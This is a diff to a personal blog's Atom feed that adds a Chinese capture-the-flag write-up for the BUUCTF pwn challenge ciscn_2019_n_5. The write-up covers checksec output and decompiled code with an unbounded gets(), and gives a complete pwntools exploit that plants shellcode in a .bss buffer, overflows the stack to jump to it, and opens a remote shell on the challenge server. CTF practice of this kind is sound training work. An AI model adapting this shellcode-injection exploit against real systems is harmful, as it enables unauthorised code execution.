@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://cc-nianchu.github.io</id>
     <title>nianchu</title>
-    <updated>2021-08-01T13:37:41.851Z</updated>
+    <updated>2021-08-03T14:40:51.557Z</updated>
     <generator>https://github.com/jpmonette/feed</generator>
     <link rel="alternate" href="https://cc-nianchu.github.io"/>
     <link rel="self" href="https://cc-nianchu.github.io/atom.xml"/>
@@ -10,6 +10,55 @@
     <logo>https://cc-nianchu.github.io/images/avatar.png</logo>
     <icon>https://cc-nianchu.github.io/favicon.ico</icon>
     <rights>All rights reserved 2021, nianchu</rights>
+    <entry>
+        <title type="html"><![CDATA[每日1+（认怂了）]]></title>
+        <id>https://cc-nianchu.github.io/post/mei-ri-1ren-song-liao/</id>
+        <link href="https://cc-nianchu.github.io/post/mei-ri-1ren-song-liao/">
+        </link>
+        <updated>2021-08-03T14:40:25.000Z</updated>
+        <content type="html"><![CDATA[<h2 id="buu-ciscn_2019_n_5">buu ciscn_2019_n_5</h2>
+<p>在buu上拿到附件 checksec一下</p>
+<pre><code>    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX disabled
+    PIE:      No PIE (0x400000)
+    RWX:      Has RWX segments
+</code></pre>
+<p>发现这是64位系统 没开任何保护<br>
+打开ida64  找到main函数按F5获得伪代码</p>
+<pre><code>int __cdecl main(int argc, const char **argv, const char **envp)
+{
+  char text[30]; // [rsp+0h] [rbp-20h] BYREF
+
+  setvbuf(stdout, 0LL, 2, 0LL);
+  puts(&quot;tell me your name&quot;);
+  read(0, name, 0x64uLL);
+  puts(&quot;wow~ nice name!&quot;);
+  puts(&quot;What do you want to say to me?&quot;);
+  gets(text);
+  return 0;
+}
+</code></pre>
+<p>发现第一次让我们输入名字 然后限制长度为0x64  并且name是在.bss段上<br>
+第二次是利用gets函数，没有限制长度，可以用gets函数进行溢出<br>
+我们得思路是:<br>
+第一个漏洞写入shellcode<br>
+然后第二个漏洞溢出去到name参数去然后执行shellcode拿到shell<br>
+exp:</p>
+<pre><code>from pwn import*
+
+q=remote('node4.buuoj.cn',25042)
+
+q.sendlineafter('tell me your name',asm(shellcraft.sh()))
+
+payload='a'*0x28+p64(0x601080)
+q.sendlineafter('What do you want to say to me?',payload)
+
+q.interactive()
+</code></pre>
+]]></content>
+    </entry>
     <entry>
         <title type="html"><![CDATA[每日3+]]></title>
         <id>https://cc-nianchu.github.io/post/mei-ri-3/</id>
